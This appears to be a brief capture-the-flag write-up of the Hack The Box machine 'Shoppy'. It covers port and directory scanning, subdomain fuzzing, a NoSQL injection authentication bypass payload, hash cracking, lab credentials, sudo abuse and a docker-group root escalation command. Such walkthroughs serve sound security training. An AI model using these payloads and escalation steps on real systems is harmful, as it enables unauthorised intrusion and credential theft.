Shoppy.htb

Racon:
                nmap -A -F shoppy.htb  
                                discoverd 2 open ports 80 and 22
                                nothing intresting on web browser just a timer.!!  
                
                feroxbuster -u http://shoppy.htb/ -w /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
                                Found a new page named admin>redirected to login page.                    
                               
                wfuzz -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /home/kali/workspace/tools/SecLists/Discovery/DNS/namelist.txt -v  --sc 200
                                 found a subdomain named mattermost.shoppy.htb, which is a login page. 
      
         
                       
Initial Foothold:

                login page of shoppy.htb we tried an nosql injection with payload admin' || '1=1 which successfully bypassed authentication and helped us to get inside.
                By syccessfully loging in we found a search box and used our same payload and dumped 2 username and hashed passwords.Using hashcat we found password of second user named josh **josh:remembermethisway**
                login into mattermost.shoppy.htb with these credentials we found some chat groups. One named Deploy Machine was fishy so we looked into that an found another username and password **jaeger:Sh0ppyBest@pp!**


Foothold:
                
                Taking ssh via   jaeger:Sh0ppyBest@pp!
                executing sudo -l we get a output as ```User jaeger may run the following commands on shoppy:
                                                             (deploy) /home/deploy/password-manager```
                Executing **sudo -u deploy /home/deploy/password-manager** asked for another master password.
                Execute cat /home/deploy/password-manager > which shows Sample as password              
                again run sudo -u deploy /home/deploy/password-manager : Sample as master password. which ended up in giving username and password of deploy as deploy:Deploying@pp!

Privillage Exclation: 

                when we run id command we found deploy user in docker group so from gtfobins docker run -v /:/mnt --rm -it alpine chroot /mnt sh
                              

Pwned!!!!


